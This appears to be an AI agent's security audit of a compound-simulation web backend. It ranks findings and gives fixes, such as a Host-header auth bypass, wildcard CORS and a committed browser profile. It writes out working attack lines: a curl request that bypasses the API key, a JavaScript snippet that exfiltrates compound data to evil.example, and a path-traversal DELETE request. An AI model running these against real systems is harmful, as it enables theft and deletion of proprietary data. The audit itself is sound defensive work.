# Security audit — Studio backend, engine, and marketing site

Read-only pass, 2026-08-14. Scope: `app/server/`, `app/web/`, `tmesim/`, `landing-3d/`,
git history, dependencies. No file in the repo was modified by this audit; the only
write is this document.

**Line numbers were re-verified against `app/server/api.py` at the end of the pass and hold
for C1, M5 and H4.** Other agents were editing `app/server/`, `tmesim/` and `landing-3d/`
concurrently (the Vivum→Codon rename), and one reference already moved during the audit
(the static mount shifted from 2042 to 2218). Findings are described by surrounding code as
well as line number — match on the quoted code, not the line, when dispatching fixes.

Threat model taken from the brief: the Studio holds an operator's **unpublished compound
structures (SMILES), their IC50s, and patient-derived tissue sections**. Disclosure of an
unpublished compound series is the catastrophic outcome. Findings are ranked against that,
not against a generic web-app checklist.

**Counts:** 3 CRITICAL · 5 HIGH · 7 MEDIUM · 3 LOW · 9 CLEAN, plus a Dependencies section
(version-matched against OSV; 6 verified high-severity npm advisories and a verified
authentication bypass in the installed Starlette, promoted to C1).

**Safe to expose to external field testers as-is? — NO.** See the three-line summary at the
end. C1–C2 and H1–H3 are the blockers; none is architecturally hard to fix.

---

# CRITICAL — act before any external exposure

## C1. One HTTP header defeats the API key entirely — verified working on the installed Starlette

**This is the single most urgent finding. It nullifies the only authentication control in the
product, in exactly the deployment mode a field test would use. No credential, no user
interaction, no special network position — one request header.**

The gate at `app/server/api.py:1417` makes an authentication decision on `request.url.path`:

```python
if request.url.path.startswith("/api/") and request.method != "OPTIONS":
    if request.headers.get("x-api-key", "") != api_key:
        return JSONResponse({"detail": "missing or incorrect X-API-Key header"}, status_code=401)
```

Installed `starlette 0.49.3` is affected by **GHSA-86qp-5c8j-p5mr / CVE-2026-48710** —
"missing Host header validation poisons `request.url.path`, bypassing path-based security."
That advisory describes this code exactly.

**Mechanism, reproduced against the installed version.** Starlette builds `request.url` by
concatenating scheme + Host header + path and re-parsing. A `/` inside the Host value
terminates the authority, so the remainder is absorbed into the path:

```
Host: '127.0.0.1:8000'  -> .path='/api/compounds'      startswith('/api/')=True
Host: 'x/../'           -> .path='/..//api/compounds'  startswith('/api/')=False
```

The **router** dispatches on `scope["path"]`, which is still `/api/compounds` — so the
endpoint runs while the gate is skipped. End-to-end proof against a faithful copy of the
middleware:

```
plain                status=401 BYPASSED=False
Host absolute-URI    status=401 BYPASSED=False
Host: x/../          status=200 BYPASSED=True     <-- secret returned, no API key sent
Host: a@b            status=401 BYPASSED=False
```

**Exploit.** Against a team deployment (`codon studio --host 0.0.0.0 --api-key <secret>` —
documented mode 1b, `docs/DEPLOYMENT.md:30-45`), any unauthenticated party who can reach the
port:

```bash
curl -H 'Host: x/../' http://studio.internal:8000/api/compounds
```

returns the full compound library — `name`, `smiles`, `ic50_uM` — with no key. The same header
unlocks every other `/api/*` route, including `DELETE /api/compounds/{id}` and
`POST /api/runs`.

**Blast radius:** total, and it is worse than C2 because it applies to the *authenticated*,
network-exposed configuration — the one a field test would actually run. Every reassurance in
`docs/DEPLOYMENT.md` about non-loopback binds being protected by a key is void while this
holds.

**Fix — do both. Do not rely on the upgrade alone.**

1. **Stop making security decisions on `request.url.path`.** Use the raw ASGI scope path, which
   the router itself uses and which the Host header cannot influence.
   `app/server/api.py:1417`:

   ```python
   if request.scope["path"].startswith("/api/") and request.method != "OPTIONS":
       if not secrets.compare_digest(request.headers.get("x-api-key", ""), api_key):
           return JSONResponse(
               {"detail": "missing or incorrect X-API-Key header"}, status_code=401)
   ```
   (This also folds in M5's constant-time comparison.)

   Prefer **allow-listing** the unauthenticated paths over blocking a prefix, so that any route
   which fails to match the static-file allowlist is authenticated by default rather than
   exposed by default.

2. **Validate the Host header**, which closes the whole advisory class rather than this one
   symptom — add Starlette's `TrustedHostMiddleware`:

   ```python
   from starlette.middleware.trustedhost import TrustedHostMiddleware
   app.add_middleware(
       TrustedHostMiddleware,
       allowed_hosts=[h for h in os.environ.get(
           "TMESIM_STUDIO_ALLOWED_HOSTS", "localhost,127.0.0.1").split(",") if h])
   ```

3. Upgrade Starlette when practical — but note the fix landed in the **1.x** line
   (see Dependencies), which is a major-version jump requiring FastAPI coordination. Fixes 1
   and 2 are effective immediately and independently of that.

## C2. Any website the operator visits can read and delete their entire compound library

**Actively exploitable today, in the default configuration, with no credential and no network
position.**

`app/server/api.py:1399-1404`:

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`app/server/api.py:1413-1414` — the API key gate is **off unless `TMESIM_STUDIO_API_KEY` is
set**, and `app/server/__main__.py:60-71` only sets it when `--host` is non-loopback. So the
documented default mode (`docs/DEPLOYMENT.md:20-28`, "Binds to `127.0.0.1`. No API key is
required or generated.") runs with **no authentication and wildcard CORS**.

**Why loopback does not save you.** The deployment doc's safety argument is that binding to
`127.0.0.1` means only local processes can reach the server. A browser *is* a local process,
and any web page can drive it. `Access-Control-Allow-Origin: *` instructs the browser to hand
the response body to the calling page's JavaScript. Verified by direct reproduction of the
exact middleware config above:

```
GET  /api/compounds   Origin: https://evil.example
  Access-Control-Allow-Origin: *
  body readable by evil.example JS: [{"name":"ACME-4471","smiles":"CC(=O)Oc1ccccc1C(=O)O",...}]

PREFLIGHT for DELETE
  Allow-Origin : *
  Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
```

**Exploit.** The operator runs `codon studio` (default) and, in the same browser, visits any
page carrying attacker JS — an ad, a compromised CDN, a link in an email:

```js
fetch('http://127.0.0.1:8000/api/compounds')
  .then(r => r.json())
  .then(d => fetch('https://evil.example/collect', {method:'POST', body:JSON.stringify(d)}));
```

`GET /api/compounds` returns the stored records built at `app/server/compounds.py:282-290` —
`name`, **`smiles`**, `ic50_uM`, `note`. That is the unpublished compound series, exfiltrated
in one request. The same origin can then call `DELETE /api/compounds/{id}`
(`api.py:1554`), `POST /api/runs` (`api.py:1593`), and read `/api/runs`, `/api/sections`, and
`/api/runs/{id}/traceback`.

**Blast radius:** total, for the crown-jewel data. Read *and* write *and* delete.

**Fix** — `app/server/api.py:1399-1404`. The front end is served same-origin from this very
app, so it needs no cross-origin grant at all:

```python
_ALLOWED_ORIGINS = [o for o in
                   os.environ.get("TMESIM_STUDIO_ALLOWED_ORIGINS", "").split(",") if o]
if _ALLOWED_ORIGINS:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=_ALLOWED_ORIGINS,      # explicit hosts only, never "*"
        allow_methods=["GET", "POST", "DELETE", "OPTIONS"],
        allow_headers=["content-type", "x-api-key"],
    )
```

Default to **no CORS middleware at all**; add origins only for the split dev-port workflow the
current comment describes. Do not use `allow_origin_regex` as a shortcut.

**Secondary hardening (do both):** also require the API key on loopback, or at minimum reject
requests carrying an `Origin` header that is not same-origin. A local tool that holds
proprietary data should not treat "no key" as the default even on `127.0.0.1`.

## C3. A complete Chrome browser profile is committed to git and pushed to the remote

`results/fprof/` — **523 tracked files, 111 MB**, added in commit `8d703d3` and **present in
`origin/main`** (verified: `git ls-tree -r origin/main results/fprof | wc -l` → 523).

Tracked files include:

```
results/fprof/Default/Cookies              results/fprof/Default/History
results/fprof/Default/Login Data           results/fprof/Default/Web Data
results/fprof/Default/Login Data For Account
results/fprof/Default/Secure Preferences   results/fprof/Local State
```

No code in the repo references `fprof` (grepped across `*.py`, `*.sh`, `*.js`, `*.ts`, `*.md`,
`*.toml`, `*.yml`), and `results/fprof/` is **not** covered by `.gitignore`
(`git check-ignore` exits 1). It is a leftover browser-verification profile swept in by a
broad `git add` — the same class of accident as commit `a9a87af` ("Un-commit the agent
worktree that `git add -A` swept in"). It should have fallen under the `.export-drive/` rule.

**Exposure, stated precisely:** the GitHub repo is **private** (`gh repo view` →
`"isPrivate": true`), so this is not a public breach today. Chrome's `Cookies` and
`Login Data` values are encrypted with a key held in the macOS Keychain, so they are not
trivially readable off-host. What *is* readable off-host without any key: full browsing
history, autofill and `Web Data` contents, and device/profile identifiers. And the encrypted
session cookies become a live risk the moment the repo is shared — which is precisely what
"field testing with external users" and any diligence process involve.

I deliberately did **not** dump cookie or password values; extracting credentials from a
browser profile is correctly outside what this audit should do. Treat the contents as
compromised rather than asking anyone to verify by decryption.

**Fix**, in this order:

1. Add to `.gitignore`: `results/fprof/`
2. Purge from history — this is in a pushed commit, so `git rm` alone is insufficient:
   ```bash
   git rm -r --cached results/fprof
   # then rewrite history, e.g.
   git filter-repo --path results/fprof --invert-paths
   git push --force-with-lease origin main
   ```
   Coordinate the force-push: other worktrees/branches in this repo are live.
3. In the browser that produced the profile, sign out of all sessions and rotate any
   credential used in it. GitHub: Settings → Sessions → revoke all.
4. Note this also removes 111 MB from every clone.

---

# HIGH

## H1. Unpublished SMILES are written to world-readable files, into job logs, and served over HTTP

Three separate exposures of the same secret.

**(a) On disk, world-readable.** `app/server/compounds.py:213-220` writes with a plain
`open(tmp, "w")` → mode `0o666 & ~umask` = **0644**. No `chmod`, `umask`, or `mode=` appears
anywhere in `app/server/` (grepped). Confirmed on disk:

```
-rw-r--r--  1 samarthbasanth  staff  212  app/compounds/acme-101/compound.json
  "smiles": "COc1cc(N(C)CCN(C)C)c(NC(=O)C=C)cc1Nc1nccc(-c2cn(C)c3ccccc23)n1"
```

Every local account on the machine can read it. Same for `app/runs/*/result.json`,
`app/projects/*/project.json`, `app/reports/*`, `app/uploads/*` — all 0644, in 0755 dirs.

**(b) Into the job log, which is returned to clients.** `app/server/jobs.py:521-525`:

```python
ctx.log(f"{drug_name} is a USER-COMPILED compound from SMILES "
        f"{compound_doc.get('smiles')!r}; ...")
```

and `jobs.py:1027` logs the entire RunSpec verbatim (`spec["section"]` = patient specimen id,
`spec["drug"]` = the operator's compound name). This is live on disk today in
`app/runs/r_00076/result.json`, and reaches HTTP clients as `log_tail` on
`GET /api/runs/{id}/status`. `jobs.py:517-518` logs the compiled `ic50`.

**Fix.** Set restrictive permissions at creation, and stop logging the structure itself:

```python
# app/server/compounds.py:82, :183, :215 — and jobs.py:1114/1200, projects.py, report.py
os.makedirs(path, mode=0o700, exist_ok=True)

# app/server/compounds.py::_write, after writing tmp and before os.replace:
os.chmod(tmp, 0o600)
```
(`makedirs(mode=...)` only applies to dirs it creates; for existing dirs add an explicit
`os.chmod(path, 0o700)`.)

```python
# app/server/jobs.py:521 — log the identity, never the structure
ctx.log(f"{drug_name} is a USER-COMPILED compound "
        f"({compound_doc.get('predicted_field_count')} of "
        f"{len(compound_doc.get('fields', []))} compiled fields are predictions, "
        "not measurements)")
```

For `jobs.py:1027`, log a redacted spec — drop or hash `drug` and `section`.

## H2. The proprietary compound store is baked into every Docker image

`Dockerfile:73` is `COPY . .`. `.dockerignore` excludes `app/runs/`, `app/projects/`,
`app/reports/`, `app/uploads/`, `data_cache/`, `results/` — but **not `app/compounds/`**.
The file's own comments say it exists to mirror `.gitignore`; this entry was missed.

Any image built on an operator's workstation ships that operator's unpublished SMILES inside a
layer, and image layers are routinely pushed to registries and shared.

**Fix** — add to `.dockerignore`, next to the existing `app/runs/` entry:

```
app/compounds/
```

Also add `results/fprof/` while you are there (C3 — otherwise the browser profile is in the
image too, since `results/` is excluded but worth double-checking the pattern order).

## H3. Hand-rolled multipart parser: ~5.7x memory amplification with no body-size limit

`app/server/protocol_api.py:405-429` and `:440-464`. `python-multipart` is genuinely absent
from the venv, so the parser is hand-rolled by necessity (`protocol_api.py:408-412`).

`protocol_api.py:414` buffers the **entire request body in memory before any validation**:

```python
raw = await request.body()
```

There is no request-size limit anywhere — not in the app, not in `Dockerfile`, not in
`__main__.py`'s uvicorn call. The `_MAX_UPLOAD_BYTES = 2 * 1024 * 1024` check exists but sits
at `protocol_api.py:357`, **after** the body is buffered, split, base64-encoded, and decoded.

Measured amplification (reproduction of the exact parser, 8 MB probe):

```
NORMAL single-part parse:
  request body 8.4 MB -> peak extra alloc 39.1 MB = 4.67x
  (on top of the 8.4 MB already buffered by request.body())
EMPTY-BOUNDARY split (Content-Type: multipart/form-data; boundary=):
  body 8.4 MB -> 4,194,305 fragments, peak 34.8 MB = 4.1x
```

Total ≈ **5.7x the request size**, all before the 2 MB limit can fire. A ~500 MB request costs
~2.8 GB; a few concurrent requests OOM the process. Unauthenticated in the default config, and
there is no rate limit.

The amplification chain: `request.body()` (N) → `raw.split(sep)` copies (N) →
`base64.b64encode` (1.33N) → `.decode()` (1.33N) → `b64decode` back (N).

**Additional parser defects, same location:**

- **Empty/short boundary is accepted.** `protocol_api.py:446` takes the boundary from the
  header with no validation. `boundary=` (empty) yields `sep = b"--"`, splitting on every
  `--` in the body — 4.2 M fragment objects from 8 MB above. RFC 2046 caps a boundary at 70
  chars from a fixed charset; none of that is checked.
- **No bound on part count, part size, header length, or filename length.**
- **Unterminated bodies are silently accepted.** The loop at `:448` returns the first part
  containing `filename=` and never verifies the closing `--boundary--`, so a truncated upload
  is treated as complete. For proprietary tissue/compound files this is a silent
  data-integrity failure, partly masked by `load_drug_file` rejecting unparseable content.
- **`filename=` is matched as a bare substring** of the part headers (`:453`), not parsed from
  `Content-Disposition`, so any header containing that substring designates a file part.

**Fix.** Enforce the cap *before* buffering, and validate the boundary:

```python
# app/server/protocol_api.py, in _body(), before `raw = await request.body()`
_MAX_BODY_BYTES = 4 * 1024 * 1024
cl = request.headers.get("content-length")
if cl is not None and cl.isdigit() and int(cl) > _MAX_BODY_BYTES:
    raise HTTPException(status_code=413, detail={
        "message": f"request body exceeds {_MAX_BODY_BYTES} B"})
# Content-Length can be absent or lie: stream and abort past the cap.
chunks, total = [], 0
async for chunk in request.stream():
    total += len(chunk)
    if total > _MAX_BODY_BYTES:
        raise HTTPException(status_code=413, detail={
            "message": f"request body exceeds {_MAX_BODY_BYTES} B"})
    chunks.append(chunk)
raw = b"".join(chunks)
```

```python
# _parse_multipart, after line 446
if not (0 < len(boundary) <= 70) or not re.fullmatch(r"[0-9A-Za-z'()+_,\-./:=? ]+", boundary):
    return {"_multipart_error": "malformed multipart boundary"}
```

Also stop the base64 round-trip: have `_parse_multipart` return the raw `bytes` and let
`post_upload` size-check them directly, removing 2.66x of the amplification.

A reverse proxy (`docs/DEPLOYMENT.md` §3 already recommends Caddy/nginx) should additionally
set `client_max_body_size`. That is defence in depth, not a substitute — mode 1a has no proxy.

## H4. Full tracebacks with absolute host paths are served to clients

**Write** — `app/server/jobs.py:1326-1331`:

```python
job.error = f"{type(exc).__name__}: {exc}"
job.traceback = traceback.format_exc()
job.log(f"FAILED: {job.error}")
for line in job.traceback.rstrip().splitlines()[-12:]:
    job.log(line)
```

**Read** — `app/server/api.py:1638-1642`:

```python
@app.get("/api/runs/{run_id}/traceback")
def get_run_traceback(run_id: str) -> Dict:
    job = _require(jobs, run_id)
    return {"run_id": run_id, "status": job.status, "error": job.error,
            "traceback": job.traceback}
```

`traceback.format_exc()` always contains absolute paths
(`File "/Users/samarthbasanth/tme-sim/tmesim/..."`), disclosing the repo root, the operator's
**username**, and internal module structure. The last 12 traceback lines also reach
`GET /api/runs/{id}/status` via `log_tail`, and `GET /api/runs` returns `"error"` for every
run in history in a single call. Combined with C1 and C2, all of this is reachable unauthenticated.

**Fix.** Keep the diagnostic locally, gate it on an explicit opt-in, and scrub the root:

```python
# app/server/api.py:1638
@app.get("/api/runs/{run_id}/traceback")
def get_run_traceback(run_id: str) -> Dict:
    job = _require(jobs, run_id)
    if os.environ.get("TMESIM_STUDIO_EXPOSE_TRACEBACKS", "") != "1":
        raise HTTPException(status_code=404, detail={
            "message": "traceback disclosure is disabled",
            "reason": "set TMESIM_STUDIO_EXPOSE_TRACEBACKS=1 to enable locally"})
    return {"run_id": run_id, "status": job.status, "error": job.error,
            "traceback": job.traceback.replace(repo_root(), "<repo>")}
```

and drop the 12-line traceback spill into the client-visible log at `jobs.py:1330-1331`
(keep it on the server's stdout instead). The product's "a failure comes back as a
diagnostic" principle is preserved by `job.error`, which is a typed message, not a stack.

## H5. `dx_um` has no lower bound — one request allocates arbitrary memory

`app/server/api.py:587-635`. The only hard constraint is `must be > 0` (`api.py:593`);
everything else is a **warning**:

```python
if n_cells_grid > _LARGE_GRID_CELLS:      # api.py:630, _LARGE_GRID_CELLS = 1_500_000
    warnings.append(...)                  # "a cost, not an error" (api.py:131-133)
```

`validate_spec` returns `ok = not errors` (`api.py:829`) and `POST /api/runs` only rejects
when `not verdict["ok"]` (`api.py:1588`) — so warnings do not block. Grid size scales as
`(ex/dx) * (ey/dx)`, i.e. **1/dx²**. On a 5000 × 5000 µm section, `dx_um = 0.1` gives 2.5e9
voxels; a single float64 field is 20 GB. `dx_um = 0.01` is 100x worse.

This is the same hazard class as the documented `segment_vessels` O(N²) issue, but reachable
from one unauthenticated JSON POST.

**Fix** — turn the existing warning into a refusal above a hard ceiling. `api.py:630`:

```python
_MAX_GRID_CELLS = 40_000_000     # hard refusal ceiling; _LARGE_GRID_CELLS stays a warning
...
if n_cells_grid > _MAX_GRID_CELLS:
    errors.append(
        f"dx_um = {dx:g} um on this section gives a grid of ~{n_cells_grid:,.0f} "
        f"voxels, above the {_MAX_GRID_CELLS:,} ceiling. Use a coarser dx_um.")
elif n_cells_grid > _LARGE_GRID_CELLS:
    warnings.append(...)   # unchanged
```

Add a floor on `dx_um` itself (e.g. `>= 0.5`) for the case where extent is unknown and the
voxel check is skipped, and cap concurrent running jobs.

---

# MEDIUM

## M1. Path traversal in the compound store (limited, but real)

`app/server/compounds.py:86-89`:

```python
def compound_id(name: str) -> str:
    slug = re.sub(r"[^a-z0-9_.+-]+", "-", str(name).strip().lower()).strip("-")
    return slug[:80] or "compound"
```

`.` is in the allowed class, so `compound_id("..") == ".."`. Verified:

```
'..'  -> cid '..'  -> path /Users/samarthbasanth/tme-sim/app/compound.json
```

`COMPOUND_ID_RE` (`compounds.py:58`) would reject this — but it is applied **only** in
`_ids()` when listing (`:227`), never when resolving a caller-supplied id. `_dir()`/`_path()`
(`:190-194`) take the value straight from `compound_id()`, and `get()` (`:245`), `delete()`
(`:304`) and `compile_stored()` (`:319`) are reached directly from
`GET /api/compounds/{compound_id}` (`api.py:1541`) and `DELETE /api/compounds/{compound_id}`
(`api.py:1554`).

**Exploit:** `DELETE /api/compounds/%2E%2E` (URL-encoded to survive client-side path
normalisation) → `os.remove("<repo>/app/compound.json")`. `GET` reads the same path.

**Impact is genuinely limited** — `/` and `\` are folded to `-`, so traversal cannot chain
past one level, and the filename is always `compound.json`. No such file normally exists.
I am marking this MEDIUM, not HIGH, on that basis. It is a latent primitive that becomes
serious if the store layout ever changes.

**Fix** — enforce the regex that already exists, at the point of use:

```python
# app/server/compounds.py, replace _dir/_path bodies (:190-194)
def _safe_cid(self, cid: str) -> str:
    if not COMPOUND_ID_RE.match(cid):
        raise CompoundError(f"invalid compound id {cid!r}", status=400,
                            code="invalid_compound_id")
    return cid

def _dir(self, cid: str) -> str:
    return os.path.join(self.root, self._safe_cid(cid))

def _path(self, cid: str) -> str:
    return os.path.join(self._dir(cid), "compound.json")
```

## M2. `/api/sections/scan` is an unauthenticated arbitrary-path filesystem oracle

`app/server/api.py:1437-1486` → `ingest_registry.scan()` (`ingest_registry.py:141`) →
`tmesim/data/ingest.py:1789` → `detect()` (`ingest.py:341`):

```python
path = os.path.abspath(os.path.expanduser(str(path)))
```

No confinement to any base directory. This is **deliberate** — the docstring says "Inspect ANY
directory" — and for a trusted local operator it is a reasonable design. Combined with C1/C2 it
becomes a capability any web page can invoke. What a caller learns for an arbitrary path:

- **Existence and type**, from `ingest.py:347-351`:
  `"{path} is not a directory" + (" and does not exist" if ...)` — a clean oracle.
- **Partial directory listing** — `contained_samples` (`ingest.py:363-372`) enumerates child
  directories.
- **Absolute paths**, echoed in `detection.path` and `files` (`ingest.py:1802-1805`).

It does **not** read arbitrary file *contents* — only recognised layout components. So this is
filesystem reconnaissance and metadata disclosure, not arbitrary file disclosure. Related:
`GET /api/sections` returns `cache_dir` absolute paths and patient specimen identifiers
(e.g. `AT10-BRA-5-FO-1_1`) from `app/runs/_ingested_sections.json` (`cache.py:669`,
`ingest_registry.py:210`).

**Fix.** Fixing C1 and C2 removes remote reachability, which is the main thing. Beyond that, confine
scanning to a configured roots list:

```python
# app/server/api.py, in post_scan before calling ingest_registry
_ROOTS = [os.path.abspath(p) for p in
          os.environ.get("TMESIM_STUDIO_DATA_ROOTS", os.path.join(repo_root(), "data_cache")
                        ).split(os.pathsep) if p]
target = os.path.abspath(os.path.expanduser(str(body["path"])))
if not any(os.path.commonpath([target, r]) == r for r in _ROOTS):
    raise HTTPException(status_code=403, detail={
        "message": "path is outside the configured data roots",
        "roots": _ROOTS})
```

and return `os.path.relpath(path, root)` rather than absolute paths in responses.

## M3. No security headers on either the FastAPI app or the Next.js site

**FastAPI** — `app/server/api.py` registers exactly two middleware: `CORSMiddleware` (`:1399`)
and the API-key gate (`:1415`). Absent: `Content-Security-Policy`, `X-Frame-Options`,
`X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`,
`Permissions-Policy`. Confirmed by direct grep for each header name — zero hits.

This matters more than usual here because the front end stores the API key in `localStorage`
(`docs/DEPLOYMENT.md:56-58`); a CSP is the standing mitigation against a future XSS stealing
it. (No XSS exists today — see CLEAN.) Absent `X-Frame-Options`/`frame-ancestors`, the Studio
UI can also be framed.

**Fix** — one middleware in `create_app()`, after the CORS block:

```python
@app.middleware("http")
async def _security_headers(request: Request, call_next):
    resp = await call_next(request)
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("X-Frame-Options", "DENY")
    resp.headers.setdefault("Referrer-Policy", "no-referrer")
    resp.headers.setdefault("Permissions-Policy",
                            "geolocation=(), microphone=(), camera=()")
    resp.headers.setdefault(
        "Content-Security-Policy",
        "default-src 'self'; img-src 'self' data: blob:; "
        "style-src 'self' 'unsafe-inline'; script-src 'self'; "
        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'")
    return resp
```

Verify the CSP against the WebGL/worker front end before shipping — `blob:` is included for
canvas/worker use; tighten `style-src` if the UI does not need inline styles. Add HSTS only
behind TLS termination.

**Next.js** (`landing-3d/`) — no `headers()` in the Next config and no `middleware.ts`, so the
marketing site also ships bare. Lower stakes (static marketing content, no proprietary data),
but it is a public-facing property.

**Fix** — in `landing-3d/next.config.*`:

```js
async headers() {
  return [{ source: '/:path*', headers: [
    { key: 'X-Content-Type-Options', value: 'nosniff' },
    { key: 'X-Frame-Options', value: 'DENY' },
    { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
    { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  ]}];
}
```

## M4. Runtime upload directory has tracked files despite the `.gitignore` rule

`.gitignore` has `app/uploads/*` with `!app/uploads/.gitkeep`, but gitignore does not untrack
files already tracked. `git ls-files app/uploads` returns **6** files, 5 of them uploaded
content: `cpd.json`, `cpd_47.sdf`, `passwd.smi`, `tpl_b64.json`, `tpl_route_test.smi`.

The SMILES in them are temozolomide (published), so this is **not itself a proprietary leak** —
but the containment mechanism is confirmed broken: a future upload written under one of those
tracked names would be committed by any `git commit -a`.

**Fix:**

```bash
git rm --cached app/uploads/cpd.json app/uploads/cpd_47.sdf app/uploads/passwd.smi \
                app/uploads/tpl_b64.json app/uploads/tpl_route_test.smi
```

If those files are wanted as test fixtures, move them to `tests/fixtures/` and have the tests
reference them there, rather than leaving them in a runtime data directory.

## M5. API key compared with `!=` rather than a constant-time comparison

`app/server/api.py:1418`:

```python
if request.headers.get("x-api-key", "") != api_key:
```

Python's `str.__eq__` short-circuits on the first differing byte. Remote timing attacks across
a network are impractical in most conditions, so this is not urgent — but the fix is one line
and this is the only credential in the system.

**Fix:**

```python
import secrets  # already imported in __main__.py; add to api.py
if not secrets.compare_digest(request.headers.get("x-api-key", ""), api_key):
```

## M6. The venv runs Python 3.9.6 — an EOL branch, 19 patch releases behind

`./.venv/bin/python -V` → **Python 3.9.6**, released 2021-06-28. The 3.9 series ended at
3.9.25 and reached **end-of-life 2025-10-31**, so this interpreter is 19 patch releases behind
the final release and the branch now receives no CPython security fixes at all. See the
Dependencies section for the verified detail, including the Apple-backport caveat.

One concrete consequence is already visible in this codebase: `tarfile.extractall` on 3.9 has
**no `filter` parameter at all** (verified — signature is
`(self, path='.', members=None, *, numeric_owner=False)`), so the extraction-filter hardening
added in later versions is simply unavailable. See L1.

**Fix.** Rebuild the venv on a current interpreter (3.12 or 3.13). Check
`pyproject.toml`'s `requires-python` and the `Dockerfile` base image at the same time so the
container and the workstation agree.

## M7. No rate limiting, no request timeout, no concurrency cap

There is no rate limiter, no per-request timeout, and no cap on concurrent jobs anywhere in
`app/server/`, the `Dockerfile`, or `__main__.py`'s uvicorn invocation. Each run allocates
full float64 grids and a cell population (`RECON_CACHE` default maxsize 4). Combined with H5
and H3, a single client can trivially exhaust the host.

**Fix.** For the firewalled deployment this is mostly a reverse-proxy concern — add
`limit_req` (nginx) / `rate_limit` (Caddy) and a body cap in the §3 config in
`docs/DEPLOYMENT.md`. In-process, add a bounded job queue and reject submissions with 429
when the queue is full, plus `--timeout-keep-alive` on uvicorn.

---

# LOW

## L1. `tarfile.extractall` with no member validation (latent — not currently reachable)

`tmesim/data/ingest.py:1842-1844`:

```python
def _extract_tar(tar_path: str, dest: str) -> None:  # pragma: no cover - helper
    with tarfile.open(tar_path, "r:*") as tf:
        tf.extractall(dest)
```

A tar entry named `../../..../x` escapes `dest` (the CVE-2007-4559 class), and on Python 3.9
there is no `filter=` to prevent it (M6).

**It is not currently exploitable: `_extract_tar` has no call sites** (grepped repo-wide —
only the definition at `:1842`). But `ingest.py:442` already tells users "ingest() extracts
it", so the intent to wire this up exists, and the day it is wired to a user-supplied
directory it becomes an arbitrary file write. Fix it before that happens.

Two other `extractall` calls exist — `tmesim/data/spatial_ingest.py:206-207` and
`tmesim/data/real/singlecell_spatial.py:313-314` — operating on archives downloaded from
hardcoded public dataset URLs, not on user input. Risk is limited to a compromised upstream or
MITM, and both are CLI/acquisition paths not reachable from `app/server/`.

**Fix** — validate members before extracting (works on 3.9):

```python
def _extract_tar(tar_path: str, dest: str) -> None:
    dest_abs = os.path.abspath(dest)
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if m.issym() or m.islnk():
                raise ValueError(f"refusing link member in archive: {m.name!r}")
            target = os.path.abspath(os.path.join(dest_abs, m.name))
            if os.path.commonpath([target, dest_abs]) != dest_abs:
                raise ValueError(f"refusing member outside destination: {m.name!r}")
        tf.extractall(dest)
```

On Python 3.12+, `tf.extractall(dest, filter="data")` supersedes this.

## L2. Raw exception text in ~25 response bodies

Beyond H4, `str(exc)` / `f"{type(exc).__name__}: {exc}"` reaches response bodies at
`api.py:182, 209, 224, 242, 269, 290, 326, 1462, 1575, 1586, 1689`;
`compounds.py:152, 206, 275`; `projects.py:322`; `report.py:784, 1009`;
`ingest_registry.py:196, 200`; `protocol_api.py:519-522`; `cache.py:399, 403, 449, 478, 701,
736`. Most are benign parse errors. The ones worth changing are `compounds.py:206` and
`projects.py:322`, where an `OSError`/`JSONDecodeError` on a corrupt file typically embeds the
**absolute path** in its `str()`.

**Fix** — for those two, log the detail server-side and return the id only:

```python
raise CompoundError(f"compound {cid!r} is on disk but unreadable", status=500)
```

## L3. The generated API key is printed to stdout and never persisted

`app/server/__main__.py:82-85` prints the key in plaintext. This is a deliberate, documented
choice (`docs/DEPLOYMENT.md:47-54`, and the doc notes the key is intentionally kept out of
`docker logs`). Flagging only so it is a recorded decision: terminal scrollback and terminal
multiplexer logs will retain it.

---

# CLEAN — checked, nothing found

These were examined and are genuinely clean. Listed so the coverage is auditable.

1. **Static file mount cannot escape `app/web/`.** `app/server/api.py:2218` is stock
   `StaticFiles(directory=web_dir, html=True)` with `web_dir` absolute via `repo_root()`.
   Starlette's `get_path` normalises and strips `..`/`.` components (verified by reading the
   installed source), and `lookup_path` additionally rejects paths outside the root. No
   symlinks exist under `app/web/` (`find app/web -type l` → empty). The mount is registered
   last, after every `/api/*` route, so it shadows nothing. **No other `StaticFiles` mount
   exists** — `app/runs/`, `app/compounds/`, `results/`, `data_cache/` are not directly served.
2. **No SQL anywhere.** No database, no ORM, no query construction. Not applicable.
3. **No command injection or code-execution primitives in the served code.** Grepped
   `app/`, `tmesim/`, `scripts/` for `eval(`, `exec(`, `os.system`, `subprocess`,
   `shell=True`, `__import__`, `yaml.load(` — **zero hits** in `app/`. The only `pickle.load`
   calls are in `tmesim/validation/*` (6 sites) reading regenerable local caches the module
   itself wrote; none is reachable from an HTTP endpoint or takes user-supplied bytes.
4. **SMILES handling is properly bounded before RDKit.** `tmesim/molecular/byo.py:148-149`
   sets `MAX_SMILES_LEN = 600` and `MAX_NAME_LEN = 64`, enforced at `:261` and `:383` — i.e.
   **before** `Chem.MolFromSmiles` at `:401` — with `MW_MAX` and ~20 further `CompoundRefused`
   checks. User SMILES is not a DoS vector into RDKit. This is the best-defended input in the
   product.
5. **No XSS in the front end.** Only 4 `innerHTML` uses in `app/web/js/`; three are
   `innerHTML = ''` (clearing). The fourth, `app/web/js/util/dom.js:32`, is a generic
   `html:` prop — and **no caller anywhere passes `html:`** (grepped). Everything renders
   through `textContent`. User-controlled compound names, notes and SMILES are never
   interpolated into markup.
6. **No secrets in tracked files.** Scanned all 721 non-binary tracked files for AWS keys,
   `sk-` tokens, `ghp_`, Slack tokens, Google API keys, and PEM private-key headers. The two
   apparent hits in `results/studio_export*.html` are **false positives**: base64 payload
   strings matching `AKIA` only case-insensitively (`AkIAAAAA0aQdQoPpKELE` — lowercase `k`;
   real AWS ids are uppercase). No `.env` file is tracked or present. `landing-3d/` ships only
   `.env.local.example`. The `.gitignore` rewrite introduced no tracked-secret regression —
   the only thing wrongly tracked is C3's browser profile.
